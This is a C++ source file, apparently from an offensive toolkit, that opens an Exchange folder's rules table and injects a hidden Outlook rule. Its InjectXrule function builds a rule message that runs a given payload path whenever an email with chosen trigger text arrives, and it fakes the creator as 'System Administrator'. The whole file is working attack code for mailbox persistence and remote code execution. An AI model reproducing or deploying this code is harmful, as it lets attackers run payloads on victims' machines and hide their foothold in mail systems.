#include "StdAfx.h"

// Modules.
#include "MapiToolsModule.h"

// Other libraries.
#include "../../3rdParty/Exchange/EdkGuid.h"									//< MAPI GUIDs.

#include "ExtendedRuleCondition.h"
#include "ExtendedRuleActions.h"

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
MapiTools::ExchangeModifyTable MapiTools::MapiFolder::OpenRulesTable() const
{
	// Sanity check.
	ValidateParam(m_Pointer);

	// Retrieve the table and return is as an table object.
	LPEXCHANGEMODIFYTABLE table;
	CallWinApiHr(m_Pointer->OpenProperty(PR_RULES_TABLE, const_cast<LPGUID>(&IID_IExchangeModifyTable), 0, MAPI_DEFERRED_ERRORS, reinterpret_cast<LPUNKNOWN*>(&table)));
	return table;
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void MapiTools::MapiFolder::InjectXrule(const std::wstring& ruleName, const std::wstring& triggerText, const std::wstring& payloadPath) const
{
	// Validate input.
	ValidateParam(m_Pointer);
	ValidateParam(!ruleName.empty());
	ValidateParam(ruleName.size() < 256);
	ValidateParam(!triggerText.empty());
	ValidateParam(triggerText.size() < 256);
	ValidateParam(!payloadPath.empty());
	ValidateParam(payloadPath.size() < 256);

	// Create new message.
	LPMESSAGE message;
	CallWinApiHr(m_Pointer->CreateMessage(NULL, MAPI_ASSOCIATED, &message));
	SCOPE_GUARD{ if (message) message->Release(); };

	// Define a zero byte stream to point to later.
	BYTE zero = 0;

	// ExtendedRuleCondition and ExtendedRuleActions packets/byte streams.
	MapiTools::ExtendedRuleCondition extendedRuleCondition(triggerText.c_str());
	MapiTools::ExtendedRuleActions extendedRuleActions(ruleName, triggerText, payloadPath);

	// Let's create property array that will be used to update newly created message.
	SPropValue lppPropArray[]
	{
		MapiTools::PropertyValueLong(PR_ACCESS, 3),
		MapiTools::PropertyValueLong(PR_ACCESS_LEVEL, 1),
		MapiTools::PropertyValueSBinary(PR_CHANGE_KEY, { 0x9D, 0x83, 0x80, 0xE2, 0x03, 0x76, 0x4F, 0x46, 0xA1, 0xA2, 0xF5, 0x4F, 0xED, 0xFD, 0xFC, 0xE0, 0x00, 0x00, 0x00, 0xAD, 0x0A, 0x3C }),
		MapiTools::PropertyValueDateTime(PR_CLIENT_SUBMIT_TIME, 0x01D1F7A4, 0x08FFBD46),
		MapiTools::PropertyValueSBinary(PR_CONVERSATION_INDEX, { 0x01, 0xD1, 0xF7, 0xA4, 0x08, 0xFF, 0xC4, 0xD5, 0x38, 0xD8, 0x28, 0xCE, 0x23, 0x4C, 0x94, 0x7B, 0x35, 0xB8, 0xFF, 0x4E, 0xF4, 0xAE }),
		MapiTools::PropertyValueDateTime(PR_CREATION_TIME, 0x01D1F7A4, 0x8B217D20),
		MapiTools::PropertyValueSBinary(PR_CREATOR_ENTRYID, 1, &zero),
		MapiTools::PropertyValueTString(PR_CREATOR_NAME, TEXT("System Administrator")),
		MapiTools::PropertyValueSBinary(PR_CREATOR_SID, 1, &zero),
		MapiTools::PropertyValueTString(PR_DISPLAY_BCC, TEXT("")),
		MapiTools::PropertyValueTString(PR_DISPLAY_CC, TEXT("")),
		MapiTools::PropertyValueTString(PR_DISPLAY_TO, TEXT("")),
		extendedRuleActions,
		extendedRuleCondition,
		MapiTools::PropertyValueLong(PR_IMPORTANCE, 1),
		MapiTools::PropertyValueLong(0x0E230003, 49),
		MapiTools::PropertyValueTString(0x1035001E, TEXT("")),
		MapiTools::PropertyValueDateTime(PR_LAST_MODIFICATION_TIME, 0x01D1F7A4, 0x8B217D20),
		MapiTools::PropertyValueSBinary(PR_LAST_MODIFIER_ENTRYID, 1, &zero),
		MapiTools::PropertyValueTString(PR_LAST_MODIFIER_NAME, TEXT("System Administrator")),
		MapiTools::PropertyValueSBinary(PR_LAST_MODIFIER_SID, 1, &zero),
		MapiTools::PropertyValueTString(PR_MESSAGE_CLASS, TEXT("IPM.Rule.Version2.Message")),
		MapiTools::PropertyValueLong(PR_MESSAGE_CODEPAGE, 1252),
		MapiTools::PropertyValueDateTime(PR_MESSAGE_DELIVERY_TIME, 0x01D1F7A4, 0x08FFBD46),
		MapiTools::PropertyValueLong(PR_MESSAGE_FLAGS, 1097),
		MapiTools::PropertyValueLong(PR_MESSAGE_LOCALE_ID, 1033),
		MapiTools::PropertyValueLong(PR_MSG_STATUS, 0),
		MapiTools::PropertyValueBool(PR_NON_RECEIPT_NOTIFICATION_REQUESTED, false),
		MapiTools::PropertyValueTString(PR_PARENT_DISPLAY, TEXT("Inbox")),
		MapiTools::PropertyValueSBinary(PR_PARENT_SOURCE_KEY, { 0x9D, 0x83, 0x80, 0xE2, 0x03, 0x76, 0x4F, 0x46, 0xA1, 0xA2, 0xF5, 0x4F, 0xED, 0xFD, 0xFC, 0xE0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0E }),
		MapiTools::PropertyValueSBinary(PR_PREDECESSOR_CHANGE_LIST, { 0x16, 0x9D, 0x83, 0x80, 0xE2, 0x03, 0x76, 0x4F, 0x46, 0xA1, 0xA2, 0xF5, 0x4F, 0xED, 0xFD, 0xFC, 0xE0, 0x00, 0x00, 0x00, 0xAD, 0x0A, 0x3C }),
		MapiTools::PropertyValueLong(PR_PRIORITY, 0),
		MapiTools::PropertyValueBool(PR_READ_RECEIPT_REQUESTED, false),
		MapiTools::PropertyValueBool(PR_RTF_IN_SYNC, false),
		MapiTools::PropertyValueLong(0x65ED0003, 0),
		MapiTools::PropertyValueAString(0x65EC001E, "Internal"),
		MapiTools::PropertyValueAString(0x65EB001E, "RuleOrganizer2"),
		MapiTools::PropertyValueSBinary(0x65EE0102, { 0x40, 0x42, 0x0F, 0x00, 0x02, 0x00, 0x00, 0x00, 0x83, 0x2D, 0xD8, 0x82, 0xCE, 0xCC, 0xE4, 0x40 }),
		MapiTools::PropertyValueLong(0x65F30003, 12345),						//< PR_RULE_MSG_SEQUENCE
		MapiTools::PropertyValueLong(0x65E90003, 17),
		MapiTools::PropertyValueLong(0x65EA0003, 0),
		MapiTools::PropertyValueSBinary(PR_SEARCH_KEY, { 0x7B, 0x65, 0x41, 0x3D, 0xAE, 0x6F, 0x5A, 0x4F, 0x9F, 0xF5, 0x13, 0xF4, 0xA2, 0xBF, 0xD6, 0x80}),
		MapiTools::PropertyValueLong(PR_SENSITIVITY, 0),
		MapiTools::PropertyValueSBinary(PR_SOURCE_KEY, { 0x9D, 0x83, 0x80, 0xE2, 0x03, 0x76, 0x4F, 0x46, 0xA1, 0xA2, 0xF5, 0x4F, 0xED, 0xFD, 0xFC, 0xE0, 0x00, 0x00, 0x00, 0xAD, 0xF6, 0x7B }),
		MapiTools::PropertyValueLong(0x405A0003, 0),
		MapiTools::PropertyValueLong(0x40590003, 1661),
		MapiTools::PropertyValueTString(0x4039001E, TEXT("")),
		MapiTools::PropertyValueTString(0x4038001E, TEXT("")),
		MapiTools::PropertyValueTString(0x4025001E, TEXT("")),
		MapiTools::PropertyValueTString(0x4024001E, TEXT("EX")),
		MapiTools::PropertyValueTString(0x4023001E, TEXT("")),
		MapiTools::PropertyValueTString(0x4022001E, TEXT("EX")),
		MapiTools::PropertyValueLong(0x12060003, 0),
		MapiTools::PropertyValueBool(0x0ECD000B, false),
		MapiTools::PropertyValueSBinary(0x0E4C0102, { 0x52, 0xF4, 0x2F, 0x32, 0x70, 0x28, 0x36, 0x40, 0x88, 0x18, 0x55, 0x82, 0x05, 0x93, 0x68, 0xA7 }),
		MapiTools::PropertyValueSBinary(0x0E4B0102, { 0x52, 0xF4, 0x2F, 0x32, 0x70, 0x28, 0x36, 0x40, 0x88, 0x18, 0x55, 0x82, 0x05, 0x93, 0x68, 0xA7 }),
		MapiTools::PropertyValueLong(0x0E2F0003, 49),
		MapiTools::PropertyValueLong(0x62000003, 1492450544),
	};

	// Set properties of a blank message pointed by lpNewMessage to those we've just created.
	CallWinApiHr(message->SetProps(static_cast<ULONG>(std::size(lppPropArray)), lppPropArray, nullptr));

	// Save the message to the Exchange server.
	CallWinApiHr(message->SaveChanges(KEEP_OPEN_READWRITE));
}
